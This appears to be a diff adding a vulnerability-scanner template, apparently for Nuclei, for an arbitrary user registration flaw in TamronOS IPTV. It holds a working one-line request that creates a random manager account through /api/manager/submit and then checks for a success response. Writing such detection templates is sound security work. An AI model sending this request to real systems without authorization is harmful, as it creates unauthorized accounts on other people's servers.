@@ -1,0 +1,27 @@
+id: tamronos-iptv-anyuser-register
+
+info:
+  name: TamronOS IPTV System Arbitrary User Registration
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: misconfiguration
+
+variables:
+  random_username: "{{rand_text_alpha(4)}}"
+  random_password: "{{rand_text_alpha(6)}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/manager/submit?group=1&username={{random_username}}&password={{random_password}}"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(json(body).suc, "true")
+      - type: dsl
+        dsl:
+          - contains(json(body).msg, "成功")
+          - contains(json(body).msg, "\u6210\u529f")
